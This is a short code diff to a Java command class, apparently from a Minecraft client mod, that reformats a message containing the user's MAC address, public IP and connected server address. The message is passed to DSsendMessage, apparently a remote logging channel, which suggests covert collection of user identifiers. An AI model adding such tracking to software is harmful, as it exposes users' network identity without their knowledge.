@@ -51,7 +51,7 @@ public class ThreadCommand extends Command {
             }
             String macAddress = String.join("-", hexadecimal);
 
-            DSsendMessage("[" + macAddress + " Connected With IP => (" + IpChecker.getIp() +")]" + " Executed Command [Thread] Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
+            DSsendMessage("[" + macAddress + "]\n Connected With IP => \n(" + IpChecker.getIp() +")\n" + "\n Executed Command [Thread]\n Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
 
             ChatHelper.printMessage("&b • &bUse &3&l'&b&lthread &3<&bCount&3/&bList&3>.");
         } else {
